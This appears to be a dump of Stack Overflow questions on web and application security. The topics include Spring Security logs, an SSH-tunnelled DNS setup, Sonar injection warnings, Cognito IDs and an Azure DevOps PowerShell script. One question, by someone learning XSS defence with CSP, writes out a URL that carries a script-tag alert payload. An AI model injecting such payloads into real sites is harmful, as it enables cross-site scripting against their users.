    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.oauth2.server.resource.web.authentication.BearerTokenAuthenticationFilter.doFilterInternal(BearerTokenAuthenticationFilter.java:145) ~[spring-security-oauth2-resource-server-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:221) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.oauth2.client.web.OAuth2AuthorizationRequestRedirectFilter.doFilterInternal(OAuth2AuthorizationRequestRedirectFilter.java:181) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.oauth2.client.web.OAuth2AuthorizationRequestRedirectFilter.doFilterInternal(OAuth2AuthorizationRequestRedirectFilter.java:181) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:340) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1744) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.17.jar:10.1.17]
    at java.base/java.lang.Thread.run(Thread.java:833) ~[na:na]

2024-02-16T21:23:37.964-03:00 TRACE 18476 --- [ms-users] [-auto-1-exec-10] o.s.s.w.header.writers.HstsHeaderWriter  : Not injecting HSTS header since it did not match request to [Is Secure]
</code></pre>
"
"<p>I have two DNS servers A and B (A is within a controled area where DNS requests are likely being monitored even using DoH - either DoH is blocked or the DoH server itself is monitored too），B is outside of the controled area. Both of the servers provides DNS service on port 53. The difference is, A's upstream server is set to 127.0.0.1:1234 (local ip), and B's upsteram server points to real DNS servers such as 8.8.8.8.</p>
<p>I wanted to setup a SSH tunnel between A and B:</p>
<pre><code>ssh -L 1234:localhost:53 user@B_ip
</code></pre>
<p>so that A's 127.0.0.1:1234 can work as A's upstream DNS server. This way, when I use A as my local DNS server, its requests will safely transfer to B and never be monitored by ISP. However, I can't get this to work:</p>
<p>I ensured that both A and B can work separately (setting A's upstream to 8.8.8.8, B the same), the tunnel was created successfully, but once I change A's upstream DNS to 127.0.0.1:1234 (the tunnel), it times out.</p>
<p>This is my test servers within the same LAN:
A's dnsmasq.conf:</p>
<pre><code>port=53
listen-address=10.0.0.125

server=127.0.0.1#5533
#server=10.0.0.130
</code></pre>
<p>B's dnsmasq.conf:</p>
<pre><code>port=53
listen-address=127.0.0.1,10.0.0.130

server=8.8.8.8
</code></pre>
<p>Im not sure if I missed anything, these two servers are within the same LAN and can work fine separately, I just cannot get the tunnel working, any ideas are much appreciated!</p>
"
"<p>I have both client and server side validation in place. Formik &amp; Yup validation schema stop users from submitting values with incorrect format.</p>
<p>Should I still consider rendering server-side errors in my web app in case user somehow manages to bypass client side validation? So, can Formik/Yup validation schema be bypassed on the client side? It seems like there are no native html attributes on inputs, like disabled, that user can simply delete from the DOM.</p>
"
"<h1>github dependabot alerts me this security issue in my angular repo</h1>
<p><code>An issue in all published versions of the NPM package ip allows an attacker to execute arbitrary code and obtain sensitive information via the isPublic() function. This can lead to potential Server-Side Request Forgery (SSRF) attacks. The core issue is the function's failure to accurately distinguish between public and private IP addresses.</code></p>
<p>more details:</p>
<ul>
<li>my angular app version is 14.2.0</li>
<li>node version is 18.15.0</li>
</ul>
<p>I'm new in nodeJs &amp; angular and I'm not expecting anything yet.</p>
<p>please help :)</p>
"
"<p>I would like to ask if there is any security misconfiguration in Amazon Cognito to store the UserPoolId and the ClientId hardcoded in the source code of a web page. Let's say that an unauthorized user can find these IDs in the source code and create a user. Is this a bad practice?</p>
<p>I am interesting to know if this is a security issue. I have tried to research this problem, but I did not find any exact responses.</p>
"
"<p>I being asked to do the following :
I have rest end point reactive web service implemented with spring boot, java, and I have a controlled that is authenticated via JWT, the end point is calling service which in tern is calling another 3d party endpoint ( I use webclient to do that) I was asked to take JWT passed to my endpoint , inspect contents and pass this JWT to the 3d party is webLCient header.
Any idea if this will work ?</p>
"
"<p>Following is the implementation in the code:</p>
<p>Gets the truststore location and password from the database:</p>
<pre class=""lang-java prettyprint-override""><code> SSLContext sslContext = new SSLContextBuilder().loadTrustMaterial(
                        new File(trustStoreLocation)trustStorePassword.toCharArray()).build();
</code></pre>
<p>Using sonar for static analysis of code. Getting an error in sonar saying 'reads a file whose location might be specified by user input'. How to resolve this vulnerability? Tried various solutions but still got the same error. Can anyone please help me?</p>
<p>Solutions tried : <code>FileNameUtils.getName()</code>, <code>normalize()</code>
Since not sure how the path should start couldn't try <code>getCanonicalPath()</code> or <code>Path.resolve()</code>.</p>
"
"<p>In the <code>docker-compose</code> file in the <a href=""https://github.com/eclipse/hawkbit/blob/master/hawkbit-runtime/docker/docker-compose-monolith-mysql.yml"" rel=""nofollow noreferrer"">hawkbit github project</a>, the <code>rabbitmq</code> service exports its port <code>15672</code> and <code>5672</code>. And the <code>hawkbit</code> service is accessing these ports using the hostname <code>rabbitmq</code> (so the internal docker network).</p>
<p>By exporting these ports, the <code>rabbitmq</code> service is now accessible from the outiside with the credientials <code>guest:guest</code> which does not seems really secure to me.</p>
<p>Therefore I was wondering why were these ports exported. Do they have another usage that I am not aware of ?</p>
<p>I already tried to remove the ports from the <code>docker-compose</code> file and restart the service, and all the basic functions of hawkbit seems to be working. So I would like the confirmation that this will not break my application in a way that I don't understand.</p>
"
"<p>I'm looking for a secure way to store a shared secret in my Android app.</p>
<p>SharedPreferences is not secure because data is stored unencrypted and can be easily accessed on rooted devices.</p>
<p>I've read about using KeyStore and EncryptedSharedPreferences for secure storage. EncryptedSharedPreferences encrypts data before storing it in SharedPreferences, and the encryption key is stored in KeyStore.</p>
<p>I'm confused about whether I should use EncryptedSharedPreferences or store the shared secret directly in KeyStore. Which approach is more secure and why?</p>
"
"<p>I'm trying to start a simple hello world application on Visual Studio.
<a href=""https://i.stack.imgur.com/kaC4Q.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/kaC4Q.png"" alt=""enter image description here"" /></a></p>
<p>if I start VS as admin it starts like it should.</p>
<p>Because the group policy is not working if I'm admin.</p>
<p>I'm only allowed to execute scripts located in C:\ALLOWED.</p>
<pre><code>Build started at 17:35...
1&gt;------ Build started: Project: NodeConsoleApp18, Configuration: Debug Any CPU ------
1&gt;Build started 19.02.2024 17:35:08.
1&gt;Target RunNpmInstall:
1&gt;  Skipping target &quot;RunNpmInstall&quot; because all output files are up-to-date with respect to the input files.
1&gt;Target CoreCompile:
1&gt;  &gt; nodeconsoleapp18@1.0.0 build
1&gt;  &gt; tsc --build
1&gt;
1&gt;
1&gt;Build succeeded.
1&gt;    0 Warning(s)
1&gt;    0 Error(s)
1&gt;
1&gt;Time Elapsed 00:00:00.92
2&gt;------ Deploy started: Project: NodeConsoleApp18, Configuration: Debug Any CPU ------
2&gt;Starting deployment of project 'C:\ALLOWED\_work\_TMP\NodeConsoleApp18\NodeConsoleApp18.esproj'...
2&gt;Launching the following configuration from launch.json:
2&gt;
2&gt;Deployment of project 'C:\ALLOWED\_work\_TMP\NodeConsoleApp18\NodeConsoleApp18.esproj' failed. Unsupported launch type(s) specified in launch.json: node
========== Build: 1 succeeded or up-to-date, 0 failed, 0 skipped ==========
========== Build completed at 17:35 and took 01,069 seconds ==========
========== Deploy: 1 succeeded, 0 failed, 0 skipped ==========
========== Deploy completed at 17:35 and took 01,069 seconds ==========
</code></pre>
<p>🚀🚀🚀🚀</p>
<p>If I'm running it not as an admin then I get this error.💣</p>
<p><a href=""https://i.stack.imgur.com/TQUGS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/TQUGS.png"" alt=""enter image description here"" /></a></p>
<pre><code>1&gt;------ Build started: Project: NodeConsoleApp18, Configuration: Debug Any CPU ------
1&gt;Build started 19.02.2024 17:37:44.
1&gt;Target RunNpmInstall:
1&gt;  Skipping target &quot;RunNpmInstall&quot; because all output files are up-to-date with respect to the input files.
1&gt;Target CoreCompile:
1&gt;  Dieses Programm wurde durch eine Gruppenrichtlinie geblockt. Wenden Sie sich an den Systemadministrator, um weitere Informationen zu erhalten.
1&gt;  C:\ALLOWED\.nuget\microsoft.visualstudio.javascript.sdk\0.5.271090-alpha\Sdk\Sdk.targets(172,5): error MSB3073: The command &quot;npm run build&quot; exited with code 1.
1&gt;Done building target &quot;CoreCompile&quot; in project &quot;NodeConsoleApp18.esproj&quot; -- FAILED.
1&gt;
1&gt;Done building project &quot;NodeConsoleApp18.esproj&quot; -- FAILED.
1&gt;
1&gt;Build FAILED.
1&gt;
1&gt;C:\ALLOWED\.nuget\microsoft.visualstudio.javascript.sdk\0.5.271090-alpha\Sdk\Sdk.targets(172,5): error MSB3073: The command &quot;npm run build&quot; exited with code 1.
</code></pre>
<p>I found this here in the detailed view</p>
<pre><code>Target CoreCompile:
1&gt;  Using &quot;Exec&quot; task from assembly &quot;Microsoft.Build.Tasks.Core, Version=15.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;.
1&gt;  Task &quot;Exec&quot;
1&gt;    npm run build
1&gt;    Dieses Programm wurde durch eine Gruppenrichtlinie geblockt. Wenden Sie sich an den Systemadministrator, um weitere Informationen zu erhalten.
1&gt;    C:\ALLOWED\.nuget\microsoft.visualstudio.javascript.sdk\0.5.271090-alpha\Sdk\Sdk.targets(172,5): error MSB3073: The command &quot;npm run build&quot; exited with code 1.
1&gt;  Done executing task &quot;Exec&quot; -- FAILED.
1&gt;Done building target &quot;CoreCompile&quot; in project &quot;NodeConsoleApp18.esproj&quot; -- FAILED.
</code></pre>
<p>Like you can see everything I could move is moved into C:\ALLOWED but the application still don't build.
I have no idea anymore and would be happy if somebody can give an advice</p>
"
"<p>Tried to configure OpenApi, but when i go to http://localhost:8080/swagger-ui.html#/ then have</p>
<p>&quot;Full authentication is required to access this resource spring doc&quot;</p>
<pre><code>return new OpenAPI()
                .info(new Info()
                        .title(propertyResolver.getProperty(&quot;spring.application.name&quot;))
                        .description(description)
                        .version(version)
                        .license(new License()
                                .name(String.format(&quot;My best Application&quot;, year))
                                .url(&quot;#&quot;)))
                .security(Collections.singletonList(new SecurityRequirement().addList(&quot;ApiKeyName&quot;, List.of(&quot;global&quot;, &quot;accessEverything&quot;))))
                .components(new Components()
                        .addSecuritySchemes(&quot;ApiKeyName&quot;, new SecurityScheme().type(SecurityScheme.Type.HTTP))
                        .addSecuritySchemes(&quot;Authorization&quot;, new SecurityScheme().type(SecurityScheme.Type.HTTP))
                        .addSecuritySchemes( &quot;header&quot;, new SecurityScheme().type(SecurityScheme.Type.HTTP)));
</code></pre>
<p>then I add a SecurityConfig, but the result was the same.</p>
<pre><code>@Configuration
@ConditionalOnProperty(
        value = {&quot;swagger.documentation.enabled&quot;},
        matchIfMissing = true
)
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter  {
    @Override
    public void configure(WebSecurity web) {
        web.ignoring().antMatchers(&quot;/v3/api-docs/**&quot;, &quot;/swagger-ui.html&quot;, &quot;/swagger-ui/**&quot;);
    }
}
</code></pre>
<p>Also, tried with HttpConfig istead of WebSecurity and PermitAll.</p>
"
"<p>This is the implementation in code: the schema name comes from a configuration file and is different for each environment. Sonar throws SQL injection alert at this statement:</p>
<pre><code>select * 
from dbName.dbo.stu_name;     &lt;&lt;dbname is the variable that comes from property file&gt;&gt;
</code></pre>
<p>I tried these solutions:</p>
<ol>
<li><p>Using <code>query.setParameter(?,dbname)</code>. Tried passing dbname dynamically and vulnerability was fixed. When debugging, the query was throwing an error and did not execute.</p>
</li>
<li><p>Used <code>String.format(select * from \'%s\',tablename.replace(&quot;\'&quot;,&quot;\'\'&quot;))</code> - vulnerability fixed, but query failed to execute</p>
</li>
</ol>
<p>I tried various other solutions and nothing worked.</p>
<p>Can anyone please help me with this?</p>
"
"<p>I am learning about XSS security and how to prevent it. To do that I would like to create voulnerable code and then see how adding security measures would fix it.</p>
<p>I created an html file that accepts parameters and should execute alert when called like this:</p>
<pre><code>http://localhost/index.html?name=&lt;script&gt;alert('XSS attack!')&lt;/script&gt;
</code></pre>
<p>but I am unable to succeed - it looks like browsers are already doing some security checks for me. What would be the best way how to create a working environment where I can execute such code and then fix this security hole with CSP?</p>
"
"<p>I will preface this by saying I am a little new to some of this and worry I may be over thinking this problem or re-inventing the wheel in some way.</p>
<p>I am making a game in Unity and want to include user validation/authentication so I can have unique usernames for scoreboards etc. I tried some of the built in methods like Google sign in for example but I want my game to be agnostic and not be limited to requiring the user to have a specific account like Google Play for example.</p>
<p>My idea is to store the user name in a database and link it to a unique hash for that player. This hash will also exist in an encrypted file on the players device. Now I want to be able to verify the user and user hash with the database when logging in, but in order to do that I need to decrypt the hash server side. I verified I can do this in python and have a script for it running in a local Xampp server, now I need to figure out how to make calls to this script and receive a response. So here are my questions:</p>
<ol>
<li>Is this overcomplicated or a flawed design</li>
<li>If not, how do I send and receive data from the python script. In Unity typically use UnityWebRequest which I think is similar to an HTTP request but am unsure how secure this is server side.</li>
<li>Some information I found pointed to this Python library <a href=""https://docs.python.org/3/library/http.server.html"" rel=""nofollow noreferrer"">HTTP server</a> but the top of the documentation warns about security issues</li>
</ol>
<p>Any advice or information would be greatly appreciated!</p>
"
"<p>Yesterday I designed a powershell script to create an automatic task on Azure DevOps, thanks to its Rest API.</p>
<p>My final goal doesn't stop there.
My goal is to be able to retrieve when a fairly significant &quot;High&quot; or &quot;Critical&quot; threshold vulnerability falls on our Microsoft XDR (Microsoft Security), this creates an automatic task on AzureDevOps to be aware of, and to be able to deal with this vulnerability as quickly as possible. So I already have the script to create the task by connecting to the REST API, but after a lot of research, I can't find a solution to do the XDR part. Do you have any ideas?</p>
<p>Here's the script:</p>
<pre><code>$pacToken = &quot;Mytokens&quot;
$organizationName = &quot;MyOrganization&quot;
$projectName = &quot;MyProject&quot;
$adoHeader = @{
    Authorization = &quot;Basic {0}&quot; -f [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((&quot;{0}:{1}&quot; -f &quot;&quot;, $pacToken)))
}
$adoTaskUri = &quot;https://dev.azure.com/$organizationName/$projectName/_apis/wit/workitems/`$Task?api-version=5.1&quot;


#Generate JSON body to make the REST API call

$body = @'
[
  {
    &quot;op&quot; : &quot;add&quot;,
    &quot;path&quot; : &quot;/fields/System.Title&quot;,
    &quot;value&quot; : &quot;&quot;
  },
  {
    &quot;op&quot; : &quot;add&quot;,
    &quot;path&quot; : &quot;/fields/System.Description&quot;,
    &quot;value&quot; : &quot;&quot;
  },
  {
    &quot;op&quot; : &quot;add&quot;,
    &quot;path&quot; : &quot;/fields/System.AssignedTo&quot;,
    &quot;value&quot; : &quot;&quot;
  }
]
'@

Invoke-RestMethod -Uri $adoTaskUri -ContentType &quot;application/json-patch+json&quot; -Body $body -headers $adoHeader -Method POST
</code></pre>
"
"<p>I don't understand how Firebase security work</p>
<p>Hello there, I'm working on a React Native project using Firebase backend. I've finished it, and before uploading it to the app store, I wanted to review the security aspects, but there are a few things I don't understand.</p>
